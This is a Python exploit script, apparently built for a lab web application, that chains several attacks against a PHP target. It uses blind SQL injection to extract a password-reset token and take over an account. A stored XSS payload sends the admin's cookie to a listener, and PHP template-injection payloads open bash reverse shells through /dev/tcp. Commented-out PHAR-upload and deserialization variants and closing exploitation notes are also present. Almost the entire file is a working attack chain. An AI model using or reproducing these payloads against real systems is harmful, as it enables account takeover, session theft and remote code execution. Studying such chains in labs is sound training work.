#!/usr/bin/python3

import requests
import urllib3
import logging
import sys
from time import sleep
import string
import  concurrent.futures
import  sys
from itertools import repeat
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import subprocess
import base64

logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
http_proxy = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy}
pattern_string = ">User exists!<"

# Define Functions
def type_print(output):
    for x in output:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.04)
    sleep(1)


def enum_row_values(num_of_table_rows, query_table, column_name, index):
    for printableCharacter in string.printable:
        query = f" AND ((SELECT SUBSTRING({column_name},{index},1) from {query_table}) limit 1 offset {num_of_table_rows})=\'{printableCharacter}"
        payload = {'username':f'admin\'{query}'}
        response = session.post('http://172.17.0.2/forgotusername.php', data=payload)#, proxies=proxyDict)

        if pattern_string in response.text:
            #print(f"{printableCharacter}")
            return str(printableCharacter)
            break

def num_of_table_rows(query_table):
    for table_row_count in list(range(1,40)):

        query = f" AND (select count(*) from {query_table})=\'{table_row_count}"
        payload = {'username':f'admin\'{query}'}

        response = session.post('http://172.17.0.2/forgotusername.php', data=payload)#, proxies=proxyDict)

        if pattern_string in response.text:
            return table_row_count
            break


def display_reset_token(num_of_table_rows):

    num_of_table_rows = num_of_table_rows - 1

    ## Find the character length of the table being looped on.
    value_char_length = 32

    ## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
    with concurrent.futures.ThreadPoolExecutor() as executor:
        ## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
        row_value_letters = executor.map(enum_row_values, repeat(num_of_table_rows), repeat('tokens'), repeat('token'), list(range(1,value_char_length+1)))
    ## Dipslay the name of the table being looped.
    row_value_name = ''
    for letter in row_value_letters:
        row_value_name += letter
    #print(f"{row_value_name}")

    return row_value_name

# Class S to server as the http server handler to receive the requests with the admin cookie.
class S(BaseHTTPRequestHandler):
    # Keyword _set_response funtion for the handler class that automatically sends the HTTP response back to the client when receiving an HTTP request.
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Keyword do_GET function to performs actions when a GET HTTP request is received.
    def do_GET(self):
        # Parse the path we receive that contains the admin cookie to store it in the global var_admin_cookie variable.
        var_path = str(self.path)
        # Note that we need the keyword global so that we can pull the variable value from outside this function.
        global var_admin_cookie
        var_admin_cookie = var_path.split('=')[2]

        # Send the response to the request to complete the HTTP session.
        self._set_response()

# 1. Establish Session
type_print('1. Establishing Session.\n\n')

session = requests.Session()

# 2. Send a Test HTTP Request to web root.
response = session.get('http://172.17.0.2/')

if int(response.status_code) == 200:
    type_print("2. Web root accessible.\n\n")
else:
    type_print("2. Web adddress not accessible.")
    type_print(str(response.status_code) + "\n\n")
    sys.exit("...Exiting")

# 3. Force a token reset to be generated.
type_print('3. Generating a password reset token in the database.\n\n')

response = session.post('http://172.17.0.2/forgotpassword.php',data={'username': 'user1'})#, proxies=proxyDict)

# 4. Find the number of rows in the token reset database so that we can find the last row value which is the token we just generated.
type_print('4. Finding the number of rows in the token reset database.\n')

num_of_table_rows = num_of_table_rows("tokens")

type_print(f"4. Number of table rows is: {num_of_table_rows}\n\n")

# 5. Dipslay the reset token for the last entry in the token reset table.
type_print('5. Figuring out value of the reset token. This should take ~10 seconds and ignore any errors that get dispalyed.\n')

reset_token = display_reset_token(num_of_table_rows)

type_print(f"5. Token reset token for user1 is: {reset_token}\n\n")

# 6. Reset password for user1.
type_print("6. Resetting the password for user1.\n")

response = session.post('http://172.17.0.2/resetpassword.php', data={'token': reset_token, 'password1': 'test', 'password2': 'test'})#, proxies=proxyDict)

type_print("6. Reset password for user1 to \"test\".\n\n")

# 7. Test login with new password.
type_print("7. Testing login with new user1 password of test.\n")

response = session.post('http://172.17.0.2/login.php', data={'username': 'user1', 'password': 'test'})#, proxies=proxyDict)

if ">Login Failed<" in response.text:
    type_print("XXX --- Beans, that didn't work :( --- XXX")
    sys.exit("...Exiting")
else:
    authenticated_session_ID = session.cookies.get_dict()
    type_print(f"7. Login successful! Cookie value is: {authenticated_session_ID['PHPSESSID']}\n\n")

# 8. Plant stored XSS payload to grab admin session cookie value.

type_print("8. Injecting stored XSS payload to capture admin cookie value.\n")

response = session.post('http://172.17.0.2/profile.php', data={'description': '<script>(new Image()).src=\'http://172.17.0.1:9001/?cookie=\' + document.cookie;</script>'}, proxies=proxyDict)

type_print("8. Payload injected.  Starting up an http server to wait for the admin cookie to come. Wait up to a minute...\n")

server_address = ('', 9001)
httpd = HTTPServer(server_address, S)
try:
    # Handle_request dies after receiving 1 HTTP request.  server_forever() exists until the user kills the program.
    httpd.handle_request()
except KeyboardInterrupt:
    pass
httpd.server_close()
type_print(f'8. Admin cookie captured: {var_admin_cookie}\n')
type_print('8. Stopping server\n\n')

# 9. Authenticate as the admin to confirm our admin cookie is valid.

type_print('9. Trying to re-authenticate using the admin cookie.\n')

response = requests.get('http://172.17.0.2/index.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict)

if ">[Admin Section]<" in response.text:
    type_print("9. Confirmed we are admin!\n\n")
else:
    type_print("XXX --- Beans, that didn't work :( --- XXX\n\n")

## PHAR image upload ##
# 10. Upload poisoned PHAR script to be executed.

# type_print('10. Uploading poisoned PHAR script to be executed.\n')

# payload = "GIF98a; <?php echo shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'\"); ?>"
# #payload = "GIF98a; <?php echo shell_exec('ping -c 2 172.17.0.1'); ?>"
# upload_file = {
#     'image': ('test2.phar',payload,'image/gif'),
#     'title': (None,'test2')
# }
# response = requests.post('http://172.17.0.2/admin/upload_image.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict, files=upload_file)

## Deserialization object injection ##

# type_print('10. Exploiting PHP deserialization / object injection.\n')
# payload = "O:3:\"Log\":2:{s:1:\"f\";s:24:\"/var/www/html/test_8.php\";s:1:\"m\";s:72:\"<?php exec(\"/bin/bash -c \'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1\'\"); ?>\";}"
# response = requests.post('http://172.17.0.2/admin/import_user.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict, data={"userobj": payload})

# type_print('10. Opening shell and executing PHP deserialization.\n')
# subprocess.Popen(["nc","-nvlp","9001"])
# sleep(1)
# response = requests.get('http://172.17.0.2/test_8.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict)

## Server Side Template Injection ##
type_print('10. Exploiting PHP SSTI.\n')
payload = "{php}exec(\"/bin/bash -c \'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1\'\");{/php}"
response = requests.post('http://172.17.0.2/admin/update_motd.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict, data={"message": payload})

type_print('10. Opening shell and executing PHP SSTI.\n')
subprocess.Popen(["nc","-nvlp","9001"])
sleep(1)
response = requests.get('http://172.17.0.2/index.php', cookies=dict(PHPSESSID=var_admin_cookie), proxies=proxyDict)

# Used to keep the shell open in the terminal unitl you pass a ^C to cancel the script.
while True:
    pass

#NOTES
## Good user parameter in SQL query using PHP and Postgres:
### $ret = pg_prepare($db, "checkuser_query", "select * from users where username = $1");
### $ret = pg_execute($db, "checkuser_query", array($_POST['username']));
## Bad user parameter in SQL query using PHP and Postgres:
### $ret = pg_query($db, "select * from users where username='".$username."';");

## Image Upload
### Bypass for extensions: PHAR extension executes PHP code, but variations of just php as an extension don't get executed when you navigate to them in the URL.

## Deserialization
### Look for parts of code that deserialize user objects AND have includes in the code OR just other classes that file that allow for writing files to the file system with functions like file_put_contents.
### Look at those other classes that you can reach and understand what inputs are necessary to execute the function contianing the file writing ability.
### Structure your php serialized object to work with that object.  Let's say the function to write files to the file system is "Log" and has an input of "file_path" and "content".
### O:3:"Log":2:{s:9:"file_path";s:28:"/var/www/html/PDDIPbPlKT.php";s:7:"content";s:72:"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'"); \x0f";}
#### NOTE: in the above that the end of the payload is \x0f instead of ?>.  (For some really werid reason) When PHP deserilization occurs over an object that contains a ?>, it doesn't deserialize properly.  You need the \x0f instead of ?> at the end of the payload for the deserailization to work.

## SSTI
### More than likely a post-auth vulnerability to look into as non-auth'd (and usually non-admin) users don't have access to inject data into templates unless.
### Look for areas that take in user input through GET or (more likely) POST with curly braces {}.  This is usually the tell-tale sign that input is being interpreted as template content.
### Look at the templating package that is being used and look how the templating engine lets you run system code or interpreted language (e.g. PHP) code.

